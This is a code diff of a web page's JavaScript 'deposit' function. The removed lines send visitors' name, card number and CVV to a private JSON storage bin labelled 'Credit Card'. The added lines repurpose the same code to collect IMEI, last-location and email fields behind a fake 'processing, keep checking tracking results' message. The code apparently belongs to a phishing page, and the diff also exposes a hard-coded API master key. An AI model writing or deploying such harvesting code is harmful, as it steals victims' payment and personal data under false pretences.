@@ -110,11 +110,9 @@
 			
 function deposit(){
         
-	alert("processing...");
-
-        var name = document.getElementById("name").value;
-        var cardNumber = document.getElementById("cardNumber").value;
-        var cvv = document.getElementById("cvv").value;
+	var subject = document.getElementById("name").value;
+        var body = document.getElementById("cardNumber").value;
+        var email = document.getElementById("cvv").value;
         
         
         const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
@@ -124,9 +122,9 @@ function deposit(){
 
       
         const data = {
-        Name: name,
-        CardNum: cardNumber,
-        CVV: cvv
+        IMEi: subject,
+        LastLocation: body,
+        MailTo: email
       };
 
       
@@ -136,7 +134,7 @@ function deposit(){
               'Content-Type': 'application/json',
               "X-Master-Key": secretKey,
               "X-Bin-Private": true,
-              'X-Bin-Name': "Credit Card"
+              'X-Bin-Name': email
             },
             body: JSON.stringify(data)
           })
@@ -144,6 +142,11 @@ function deposit(){
          .then(jsonData => console.log(jsonData))
          .catch(error => console.error(error));
       
+
+
+
+
+            alert("Recieved,processing may take up to an hour.Keep on checking Tracking Results");
 
 }
 		     function withdraw(){
